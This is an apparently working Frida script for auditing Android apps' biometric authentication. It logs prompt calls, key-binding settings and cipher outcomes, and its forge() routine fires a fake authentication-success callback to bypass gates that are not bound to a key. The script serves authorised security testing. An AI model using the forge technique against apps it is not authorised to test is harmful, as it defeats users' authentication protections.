// hook-biometric-prompt.js — decide, at runtime, whether an app's biometric gate is real.
//
// PURPOSE
//   This script answers one question and refuses to answer any other:
//
//       Is this app's biometric authentication BOUND TO A CRYPTOGRAPHIC OPERATION,
//       or is it a callback whose boolean I can simply set?
//
//   It does that in three passes, which you should read in order because each one changes what the
//   next one means:
//
//     PASS 1  OBSERVE   — hook every prompt entry point and record whether a CryptoObject was
//                         passed. Touch nothing. This alone is often the whole finding.
//     PASS 2  FORGE     — call the app's own onAuthenticationSucceeded() callback with a synthetic
//                         result. If the app then unlocks, the gate was UI.
//     PASS 3  ADJUDICATE— watch what happens at the Cipher/Signature/Mac. If a real cryptographic
//                         operation runs on a key the hardware would have refused, the app was
//                         never protected. If it throws UserNotAuthenticatedException or
//                         KeyPermanentlyInvalidatedException, the binding held and your forged
//                         callback bought you a welcome screen and nothing else.
//
//   Most published "biometric bypass" demos stop after pass 2 and declare victory. Pass 3 is what
//   separates a finding from a screenshot.
//
// USAGE
//   frida -U -f com.example.target -l hook-biometric-prompt.js                # spawn
//   frida -U -n com.example.target -l hook-biometric-prompt.js                # attach
//
//   Then, from the Frida REPL:
//     forge()                 # fire onAuthenticationSucceeded on the last observed callback
//     forge(true)             # same, but attach a CryptoObject-shaped stub (see WHY below)
//     report()                # print the verdict table
//     keys()                  # print every KeyGenParameterSpec the app built, with its binding
//
//   Configure with the CONFIG block below, or from the REPL: cfg.verbose = true
//
// SCOPE / ETHICS
//   Run this only against an application you are authorised to test, on a device you own or have
//   written permission to use. It changes an app's control flow; do not point it at anything you do
//   not have a signed scope for.
//
// TESTED
//   frida 16.1.6 (host) against frida-server 16.1.6 on a rooted Redmi M2101K6P, Android 11 / API 30.
//   The androidx.biometric hooks are version-tolerant: every class is resolved lazily and a missing
//   class is reported once, not thrown.
//
// COMPANION
//   ./probe-biometrics.sh measures whether the DEVICE can enforce binding at all. Run it first.
//   A "bypass" on a device whose keystore never enforced anything is not a finding about the app.

'use strict';

// ---------------------------------------------------------------------------------------------
// CONFIG
// ---------------------------------------------------------------------------------------------
var cfg = {
    verbose: false,        // print a stack trace at every prompt call
    autoForge: false,      // forge as soon as a prompt is observed (noisy; prefer manual forge())
    watchCrypto: true,     // pass 3: hook Cipher/Signature/Mac
    watchKeyGen: true,     // record every KeyGenParameterSpec the app builds
};

// ---------------------------------------------------------------------------------------------
// STATE — everything the report is built from
// ---------------------------------------------------------------------------------------------
var state = {
    promptCalls: [],       // {api, withCrypto, cryptoDetail, ts}
    lastCallback: null,    // the app's AuthenticationCallback instance, for forge()
    lastCallbackClass: null,
    forgeAttempts: 0,
    cryptoOps: [],         // {op, alg, outcome}
    keySpecs: [],          // {alias, authRequired, validity, invalidatedByEnrolment, authType}
    missing: {},           // classes we looked for and did not find
};

function ts() { return new Date().toISOString().substr(11, 12); }
function log(s)  { console.log('[' + ts() + '] ' + s); }
function good(s) { console.log('[' + ts() + '] \x1b[32m' + s + '\x1b[0m'); }
function bad(s)  { console.log('[' + ts() + '] \x1b[31m' + s + '\x1b[0m'); }
function warn(s) { console.log('[' + ts() + '] \x1b[33m' + s + '\x1b[0m'); }

/** Resolve a class, remembering (once) if it is absent instead of throwing. */
function useClass(name) {
    try {
        return Java.use(name);
    } catch (e) {
        if (!state.missing[name]) {
            state.missing[name] = true;
        }
        return null;
    }
}

function stack() {
    try {
        return Java.use('android.util.Log')
            .getStackTraceString(Java.use('java.lang.Exception').$new());
    } catch (e) {
        return '(stack unavailable)';
    }
}

/**
 * Describe a CryptoObject without assuming which of its three payloads is populated.
 * A CryptoObject wraps exactly one of Cipher / Signature / Mac (and, from API 30,
 * IdentityCredential; from API 33, PresentationSession). Any of them may be null.
 */
function describeCrypto(co) {
    if (co === null || co === undefined) return null;
    var parts = [];
    ['getCipher', 'getSignature', 'getMac'].forEach(function (g) {
        try {
            var v = co[g]();
            if (v !== null) parts.push(g.substr(3) + '=' + v.getAlgorithm());
        } catch (e) { /* getter absent on this API level */ }
    });
    return parts.length ? parts.join(', ') : 'CryptoObject present but all payloads null';
}

function recordPrompt(api, cryptoObj, callback) {
    var detail = describeCrypto(cryptoObj);
    var entry = {
        api: api,
        withCrypto: detail !== null,
        cryptoDetail: detail,
        ts: ts(),
    };
    state.promptCalls.push(entry);

    if (entry.withCrypto) {
        good('PROMPT  ' + api + '  WITH CryptoObject  [' + detail + ']');
        good('        -> binding is at least attempted. Pass 3 decides whether it holds.');
    } else {
        bad('PROMPT  ' + api + '  NO CryptoObject');
        bad('        -> the result of this prompt is a boolean in this process. Try forge().');
    }

    if (callback !== null && callback !== undefined) {
        state.lastCallback = callback;
        try { state.lastCallbackClass = callback.$className; } catch (e) { state.lastCallbackClass = '?'; }
        log('        callback: ' + state.lastCallbackClass);
    }
    if (cfg.verbose) console.log(stack());
    if (cfg.autoForge) { setTimeout(function () { forge(); }, 300); }
}

// =============================================================================================
Java.perform(function () {

    // -----------------------------------------------------------------------------------------
    // PASS 1a — the PLATFORM API: android.hardware.biometrics.BiometricPrompt (API 28+)
    //
    // Four overloads matter. Two take a CryptoObject and two do not; that difference IS the
    // finding, so each is hooked separately rather than with a wildcard.
    // -----------------------------------------------------------------------------------------
    var PlatformPrompt = useClass('android.hardware.biometrics.BiometricPrompt');
    if (PlatformPrompt !== null) {
        PlatformPrompt.authenticate.overloads.forEach(function (ov) {
            var sig = ov.argumentTypes.map(function (a) { return a.className; });
            ov.implementation = function () {
                var args = [].slice.call(arguments);
                var crypto = null, cb = null;
                for (var i = 0; i < sig.length; i++) {
                    if (sig[i].indexOf('CryptoObject') !== -1) crypto = args[i];
                    if (sig[i].indexOf('AuthenticationCallback') !== -1) cb = args[i];
                }
                recordPrompt('android.*.BiometricPrompt.authenticate(' + sig.length + ' args)', crypto, cb);
                return ov.apply(this, args);
            };
        });
        log('hooked android.hardware.biometrics.BiometricPrompt.authenticate x'
            + PlatformPrompt.authenticate.overloads.length);
    }

    // -----------------------------------------------------------------------------------------
    // PASS 1b — the ANDROIDX API: androidx.biometric.BiometricPrompt
    //
    // This is what real apps use, because it back-ports the prompt to API 23. Its class names are
    // NOT obfuscated by default (the library ships consumer ProGuard rules), which is why grepping
    // for them in a release APK usually still works.
    // -----------------------------------------------------------------------------------------
    var XPrompt = useClass('androidx.biometric.BiometricPrompt');
    if (XPrompt !== null) {
        XPrompt.authenticate.overloads.forEach(function (ov) {
            var n = ov.argumentTypes.length;
            ov.implementation = function () {
                var args = [].slice.call(arguments);
                // authenticate(PromptInfo) | authenticate(PromptInfo, CryptoObject)
                var crypto = (n >= 2) ? args[1] : null;
                recordPrompt('androidx.biometric.BiometricPrompt.authenticate(' + n + ' args)', crypto, null);
                return ov.apply(this, args);
            };
        });
        log('hooked androidx.biometric.BiometricPrompt.authenticate x'
            + XPrompt.authenticate.overloads.length);
    }

    // Capture the androidx callback instance the moment it is constructed, because
    // androidx.biometric.BiometricPrompt stores it privately and the authenticate() overloads
    // do not receive it.
    var XCallback = useClass('androidx.biometric.BiometricPrompt$AuthenticationCallback');
    if (XCallback !== null) {
        try {
            XCallback.onAuthenticationSucceeded.implementation = function (result) {
                state.lastCallback = this;
                state.lastCallbackClass = this.$className;
                good('REAL SUCCESS  androidx callback ' + this.$className
                     + '  crypto=' + describeCrypto(safeGetCrypto(result)));
                return this.onAuthenticationSucceeded(result);
            };
            log('hooked androidx AuthenticationCallback.onAuthenticationSucceeded');
        } catch (e) {
            warn('androidx callback hook failed: ' + e);
        }
    }

    var PlatformCallback = useClass('android.hardware.biometrics.BiometricPrompt$AuthenticationCallback');
    if (PlatformCallback !== null) {
        try {
            PlatformCallback.onAuthenticationSucceeded.implementation = function (result) {
                state.lastCallback = this;
                state.lastCallbackClass = this.$className;
                good('REAL SUCCESS  platform callback ' + this.$className);
                return this.onAuthenticationSucceeded(result);
            };
            log('hooked platform AuthenticationCallback.onAuthenticationSucceeded');
        } catch (e) {
            warn('platform callback hook failed: ' + e);
        }
    }

    // -----------------------------------------------------------------------------------------
    // PASS 1c — the DEPRECATED path: FingerprintManager (API 23-27).
    //
    // Still present in shipping apps as a fallback branch below API 28. It has no
    // DEVICE_CREDENTIAL fallback and no system-drawn dialog, so an app on this path draws its own
    // UI — and an app that draws its own authentication UI is an app that can be lied to.
    // -----------------------------------------------------------------------------------------
    var FpMgr = useClass('android.hardware.fingerprint.FingerprintManager');
    if (FpMgr !== null) {
        try {
            FpMgr.authenticate.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    var args = [].slice.call(arguments);
                    recordPrompt('FingerprintManager.authenticate (DEPRECATED path)', args[0], null);
                    return ov.apply(this, args);
                };
            });
            FpMgr.hasEnrolledFingerprints.implementation = function () {
                var r = this.hasEnrolledFingerprints();
                log('FingerprintManager.hasEnrolledFingerprints() -> ' + r);
                return r;
            };
            log('hooked FingerprintManager.authenticate / hasEnrolledFingerprints');
        } catch (e) {
            warn('FingerprintManager hook failed: ' + e);
        }
    }

    // -----------------------------------------------------------------------------------------
    // PASS 1d — canAuthenticate(). Apps branch on this, and the branch is often the whole gate.
    // Logging it tells you which authenticator class the app asked for, which is the difference
    // between Class 3 and "a face that unlocks from a photograph".
    // -----------------------------------------------------------------------------------------
    [['android.hardware.biometrics.BiometricManager', 'platform'],
     ['androidx.biometric.BiometricManager', 'androidx']].forEach(function (pair) {
        var C = useClass(pair[0]);
        if (C === null) return;
        try {
            C.canAuthenticate.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    var args = [].slice.call(arguments);
                    var r = ov.apply(this, args);
                    var asked = args.length ? decodeAuthenticators(args[0]) : 'BIOMETRIC_WEAK (no-arg form)';
                    log('canAuthenticate[' + pair[1] + '](' + asked + ') -> ' + r + ' ' + decodeCanAuth(r));
                    return r;
                };
            });
        } catch (e) { warn(pair[0] + ' canAuthenticate hook failed: ' + e); }
    });

    // -----------------------------------------------------------------------------------------
    // PASS 3a — KeyGenParameterSpec. What binding did the app ASK the keystore for?
    //
    // This is the highest-signal hook in the whole script and it is not about the prompt at all.
    // An app that never calls setUserAuthenticationRequired(true) cannot have a real biometric
    // gate, no matter how convincing its dialog is.
    // -----------------------------------------------------------------------------------------
    if (cfg.watchKeyGen) {
        var Builder = useClass('android.security.keystore.KeyGenParameterSpec$Builder');
        if (Builder !== null) {
            var pending = {};   // builder handle -> partial record

            function slot(b) {
                var h = b.$h ? b.$h.toString() : String(b);
                if (!pending[h]) {
                    pending[h] = { alias: '?', authRequired: false, validity: null,
                                   invalidatedByEnrolment: null, authType: null };
                }
                return pending[h];
            }

            try {
                Builder.$init.overloads.forEach(function (ov) {
                    ov.implementation = function () {
                        var args = [].slice.call(arguments);
                        var r = ov.apply(this, args);
                        slot(this).alias = String(args[0]);
                        return r;
                    };
                });
            } catch (e) { warn('Builder.$init hook failed: ' + e); }

            hookBuilder(Builder, pending, slot, 'setUserAuthenticationRequired', function (s, a) {
                s.authRequired = a[0];
            });
            hookBuilder(Builder, pending, slot, 'setUserAuthenticationValidityDurationSeconds', function (s, a) {
                s.validity = a[0];
            });
            hookBuilder(Builder, pending, slot, 'setInvalidatedByBiometricEnrollment', function (s, a) {
                s.invalidatedByEnrolment = a[0];
            });
            hookBuilder(Builder, pending, slot, 'setUserAuthenticationParameters', function (s, a) {
                s.validity = a[0];
                s.authType = decodeAuthType(a[1]);
            });

            try {
                Builder.build.implementation = function () {
                    var s = slot(this);
                    state.keySpecs.push(s);
                    var verdict;
                    if (!s.authRequired) {
                        verdict = 'NO AUTH BINDING — any biometric prompt over this key is decoration';
                        bad('KEYSPEC ' + s.alias + '  ' + verdict);
                    } else if (s.validity !== null && s.validity > 0) {
                        verdict = 'TIME-BOUND ' + s.validity + 's — satisfied by ANY unlock in that window,'
                                + ' by any process, with no prompt from this app';
                        warn('KEYSPEC ' + s.alias + '  ' + verdict);
                    } else {
                        verdict = 'PER-USE — requires a CryptoObject and a fresh HAT. This is the strong form.';
                        good('KEYSPEC ' + s.alias + '  ' + verdict);
                    }
                    s.verdict = verdict;
                    return this.build();
                };
            } catch (e) { warn('Builder.build hook failed: ' + e); }
            log('hooked KeyGenParameterSpec.Builder');
        }
    }

    // -----------------------------------------------------------------------------------------
    // PASS 3b — the adjudicator. Did a real cryptographic operation actually run?
    //
    // Cipher.init is where UserNotAuthenticatedException surfaces. Catching it here is the proof
    // that a forged callback did NOT buy the attacker anything.
    // -----------------------------------------------------------------------------------------
    if (cfg.watchCrypto) {
        var Cipher = useClass('javax.crypto.Cipher');
        if (Cipher !== null) {
            Cipher.init.overloads.forEach(function (ov) {
                ov.implementation = function () {
                    var args = [].slice.call(arguments);
                    var alg;
                    try { alg = this.getAlgorithm(); } catch (e) { alg = '?'; }
                    try {
                        var r = ov.apply(this, args);
                        state.cryptoOps.push({ op: 'Cipher.init', alg: alg, outcome: 'OK' });
                        good('CRYPTO  Cipher.init(' + alg + ') OK  <- a real operation was authorised');
                        return r;
                    } catch (e) {
                        var name = String(e);
                        var outcome = name.indexOf('UserNotAuthenticated') !== -1
                            ? 'UserNotAuthenticatedException — HARDWARE REFUSED'
                            : (name.indexOf('KeyPermanentlyInvalidated') !== -1
                                ? 'KeyPermanentlyInvalidatedException — enrolment changed'
                                : name);
                        state.cryptoOps.push({ op: 'Cipher.init', alg: alg, outcome: outcome });
                        bad('CRYPTO  Cipher.init(' + alg + ') THREW  ' + outcome);
                        bad('        -> if you forged a callback, this is where it stopped mattering.');
                        throw e;
                    }
                };
            });
            log('hooked javax.crypto.Cipher.init x' + Cipher.init.overloads.length);
        }
    }

    log('');
    log('ready. Interact with the app, then call report(). Use forge() to test a callback-only gate.');
    var absent = Object.keys(state.missing);
    if (absent.length) log('classes not present in this app: ' + absent.join(', '));
});

// ---------------------------------------------------------------------------------------------
function hookBuilder(Builder, pending, slot, method, apply) {
    try {
        if (!Builder[method]) return;
        Builder[method].overloads.forEach(function (ov) {
            ov.implementation = function () {
                var args = [].slice.call(arguments);
                apply(slot(this), args);
                return ov.apply(this, args);
            };
        });
    } catch (e) {
        // setUserAuthenticationParameters is API 30; older devices simply do not have it.
    }
}

function safeGetCrypto(result) {
    try { return result.getCryptoObject(); } catch (e) { return null; }
}

function decodeAuthenticators(v) {
    var out = [];
    if ((v & 0x00FF) === 0x00FF) out.push('BIOMETRIC_WEAK');
    else if ((v & 0x000F) === 0x000F) out.push('BIOMETRIC_STRONG');
    if (v & 0x8000) out.push('DEVICE_CREDENTIAL');
    return out.length ? out.join('|') + ' (0x' + (v >>> 0).toString(16) + ')' : '0x' + (v >>> 0).toString(16);
}

function decodeAuthType(v) {
    var out = [];
    if (v & 0x1) out.push('AUTH_DEVICE_CREDENTIAL');
    if (v & 0x2) out.push('AUTH_BIOMETRIC_STRONG');
    return out.length ? out.join('|') : String(v);
}

function decodeCanAuth(c) {
    switch (c) {
        case  0: return '(SUCCESS)';
        case  1: return '(HW_UNAVAILABLE)';
        case 11: return '(NONE_ENROLLED)';
        case 12: return '(NO_HARDWARE)';
        case 15: return '(SECURITY_UPDATE_REQUIRED)';
        case -1: return '(STATUS_UNKNOWN)';
        case -2: return '(UNSUPPORTED)';
        default: return '';
    }
}

// ---------------------------------------------------------------------------------------------
// PASS 2 — forge(). Exported to the REPL.
//
// WHY the withCrypto argument exists: some apps read result.getCryptoObject() and dereference the
// Cipher inside it. Passing a null CryptoObject then produces a NullPointerException that looks
// like the bypass failed, when in fact the bypass reached further than you thought. forge(true)
// builds a CryptoObject around a Cipher that has NOT been authorised, so you find out whether the
// app uses the cipher or merely holds it.
// ---------------------------------------------------------------------------------------------
function forge(withCrypto) {
    if (state.lastCallback === null) {
        warn('forge(): no callback observed yet. Trigger the app\'s biometric prompt once first.');
        return;
    }
    state.forgeAttempts++;
    Java.scheduleOnMainThread(function () {
        Java.perform(function () {
            try {
                var result = null;
                var cbClass = state.lastCallbackClass || '';
                if (cbClass.indexOf('androidx') !== -1 || tryX()) {
                    var XR = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
                    var XC = Java.use('androidx.biometric.BiometricPrompt$CryptoObject');
                    var co = withCrypto ? XC.$new(makeUnauthorisedCipher()) : null;
                    // The 3-arg (crypto, authType, isKeyguard) form exists on newer androidx;
                    // fall back to whatever constructor this version ships.
                    result = newestCtor(XR, [co, 2, false], [co, 2], [co]);
                } else {
                    var PR = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
                    result = newestCtor(PR, [null, 2, false], [null, 2], [null]);
                }
                bad('FORGING onAuthenticationSucceeded on ' + cbClass
                    + (withCrypto ? ' with an UNAUTHORISED CryptoObject' : ' with a null CryptoObject'));
                state.lastCallback.onAuthenticationSucceeded(result);
                bad('forge() returned without throwing. Now check PASS 3 output:');
                bad('  - if a Cipher.init succeeded, the app was NOT protected.');
                bad('  - if nothing cryptographic happened, you have proved the gate is UI-only');
                bad('    but NOT that any protected data was reachable. Say so in the report.');
            } catch (e) {
                warn('forge() threw: ' + e);
                warn('A throw here is evidence too. An app that crashes on a synthetic result is'
                     + ' dereferencing something real — usually the CryptoObject. Retry forge(true).');
            }
        });
    });
}

function tryX() {
    try { Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult'); return true; }
    catch (e) { return false; }
}

/** Try constructor argument lists newest-first; return the first that works. */
function newestCtor(Cls, /* ...arglists */) {
    var lists = [].slice.call(arguments, 1);
    for (var i = 0; i < lists.length; i++) {
        try { return Cls.$new.apply(Cls, lists[i]); } catch (e) { /* next shape */ }
    }
    throw new Error('no AuthenticationResult constructor matched this androidx/platform version');
}

/**
 * A Cipher initialised against a NON-auth-bound throwaway key. It is a valid Cipher object, so an
 * app that only holds it will proceed; it is not the app's key, so an app that actually uses it
 * will produce wrong output. Both outcomes are informative, and neither is a bypass.
 */
function makeUnauthorisedCipher() {
    var KeyGenerator = Java.use('javax.crypto.KeyGenerator');
    var Cipher = Java.use('javax.crypto.Cipher');
    var kg = KeyGenerator.getInstance('AES');
    kg.init(256);
    var c = Cipher.getInstance('AES/GCM/NoPadding');
    c.init(1 /* ENCRYPT_MODE */, kg.generateKey());
    return c;
}

// ---------------------------------------------------------------------------------------------
function report() {
    console.log('');
    console.log('================ BIOMETRIC GATE REPORT ================');
    console.log('prompt invocations : ' + state.promptCalls.length);
    state.promptCalls.forEach(function (p, i) {
        console.log('  [' + i + '] ' + p.ts + '  ' + p.api);
        console.log('       CryptoObject: ' + (p.withCrypto ? p.cryptoDetail : 'NONE'));
    });

    console.log('');
    console.log('KeyGenParameterSpecs built : ' + state.keySpecs.length);
    state.keySpecs.forEach(function (k) {
        console.log('  ' + k.alias + '  authRequired=' + k.authRequired
                    + '  validity=' + (k.validity === null ? '(unset)' : k.validity)
                    + '  invalidatedByEnrolment=' + k.invalidatedByEnrolment
                    + (k.authType ? '  authType=' + k.authType : ''));
        console.log('       ' + (k.verdict || ''));
    });

    console.log('');
    console.log('forge() attempts : ' + state.forgeAttempts);
    console.log('crypto operations observed : ' + state.cryptoOps.length);
    state.cryptoOps.forEach(function (c) {
        console.log('  ' + c.op + '(' + c.alg + ') -> ' + c.outcome);
    });

    console.log('');
    console.log('---- VERDICT ----');
    var anyCrypto = state.promptCalls.some(function (p) { return p.withCrypto; });
    var anyBound  = state.keySpecs.some(function (k) { return k.authRequired; });
    var refused   = state.cryptoOps.some(function (c) { return c.outcome.indexOf('REFUSED') !== -1; });
    var succeeded = state.cryptoOps.some(function (c) { return c.outcome === 'OK'; });

    if (!anyCrypto && !anyBound) {
        console.log('CALLBACK-ONLY. No CryptoObject, no auth-bound key. The prompt is a UI event and');
        console.log('its result is a boolean in this process. Severity depends entirely on what the');
        console.log('gate protects — say what you actually reached, not "biometric bypass".');
    } else if (anyBound && refused && state.forgeAttempts > 0) {
        console.log('BINDING HELD. A callback was forged and the cryptographic operation was still');
        console.log('refused by the keystore. The prompt is not bypassable by this technique.');
    } else if (anyBound && succeeded && state.forgeAttempts > 0) {
        console.log('BINDING PRESENT BUT NOT EFFECTIVE. A key was auth-bound, yet an operation');
        console.log('succeeded after a forged callback. Check the validity window: a long');
        console.log('setUserAuthenticationValidityDurationSeconds is satisfied by any recent unlock.');
    } else {
        console.log('INCONCLUSIVE. Either you have not exercised the protected path, or the app');
        console.log('performs its cryptography somewhere this script does not watch (native code,');
        console.log('a JNI wrapper, or a Signature/Mac rather than a Cipher). Do not report a');
        console.log('verdict you have not observed.');
    }
    console.log('======================================================');
}

rpc.exports = {
    forge: forge,
    report: report,
    keys: function () { return state.keySpecs; },
    state: function () { return state; },
};

// Make them reachable by bare name from the interactive REPL as well as over rpc.
globalThis.forge = forge;
globalThis.report = report;
globalThis.keys = function () { console.log(JSON.stringify(state.keySpecs, null, 2)); };
globalThis.cfg = cfg;
